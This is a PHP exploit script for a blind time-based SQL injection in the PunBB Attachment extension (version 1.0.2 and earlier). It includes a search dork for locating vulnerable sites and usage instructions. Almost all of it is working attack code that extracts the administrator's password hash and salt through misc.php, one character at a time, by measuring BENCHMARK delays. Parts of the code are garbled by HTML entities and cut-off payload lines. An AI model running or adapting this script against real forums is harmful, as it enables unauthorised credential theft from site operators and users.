PunBB Extension Attachment <= 1.0.2 SQL Injection
=================================================

#!/usr/bin/php
<?php
 
print_r(&#039;
+--------------------------------------------------------------------------
-+
Punbb Extension Attachment <= v1.0.2 Bind SQL injection exploit
by puret_t
mail: puretot at gmail dot com
team: http://www.wolvez.org
dork: "Powered by PunBB"
+--------------------------------------------------------------------------
-+
&#039;);
/**
* works regardless of php.ini settings
*/
if ($argc < 3) {
print_r(&#039;
+--------------------------------------------------------------------------
-+
Usage: php &#039;.$argv[0].&#039; host path
host: target server (ip/hostname)
path: path to punbb
Example:
php &#039;.$argv[0].&#039; localhost /punbb/
+--------------------------------------------------------------------------
-+
&#039;);
exit;
}
 
error_reporting(7);
ini_set(&#039;max_execution_time&#039;, 0);
 
$host = $argv[1];
$path = $argv[2];
 
 
$benchmark = 200000000;
$timeout = 10;
 
echo "Plz Waiting...\nPassword:\n";
/**
* get pass
*/
$j = 1;
$pass = &#039;&#039;;
 
$hash[0] = 0; //null
$hash = array_merge($hash, range(48, 57)); //numbers
$hash = array_merge($hash, range(97, 122)); //a-z letters
 
while (strlen($pass) < 40) {
for ($i = 0; $i <= 255; $i ++) {
if (in_array($i, $hash)) {
$cmd =
ers%20WHERE%20group_id=1%20LIMIT%201),&#039;.$j.&#039;,1))=&#039;.$i.&#039;),BENCHMARK(&#039;.$bench
mark.&#039;,CHAR(0)),1))%23&#039;;
send();
usleep(2000000);
$starttime = time();
send();
$endtime = time();
$difftime = $endtime - $starttime;
if ($difftime > $timeout) {
$pass .= chr($i);
echo chr($i);
break;
}
}
if ($i == 255)
exit("\nExploit Failed!\n");
}
$j ++;
}
 
echo "\nSalt:\n";
/**
* get salt
*/
$j = 1;
$salt = &#039;&#039;;
 
$hash[0] = 0; //null
$hash = array_merge($hash, range(33, 126));
 
while (strlen($salt) < 12) {
for ($i = 0; $i <= 255; $i ++) {
if (in_array($i, $hash)) {
$cmd =
20WHERE%20group_id=1%20LIMIT%201),&#039;.$j.&#039;,1))=&#039;.$i.&#039;),BENCHMARK(&#039;.$benchmark
.&#039;,CHAR(0)),1))%23&#039;;
send();
usleep(2000000);
$starttime = time();
send();
$endtime = time();
$difftime = $endtime - $starttime;
if ($difftime > $timeout) {
$salt .= chr($i);
echo chr($i);
break;
}
}
if ($i == 255)
exit("\nExploit Failed!\n");
}
$j ++;
}
 
exit("\nExpoilt Success!\nPassword Hash:\t$pass\nSalt:\t$salt\n");
 
function send()
{
global $host, $path, $cmd;
 
$data = "GET ".$path."misc.php?item=1&secure_str=".$cmd."
HTTP/1.1\r\n";
$data .= "Host: $host\r\n";
$data .= "Connection: Close\r\n\r\n";
 
$fp = fsockopen($host, 80);
fputs($fp, $data);
 
$resp = &#039;&#039;;
 
while ($fp && !feof($fp))
$resp .= fread($fp, 1024);
 
return $resp;
}
 
?>



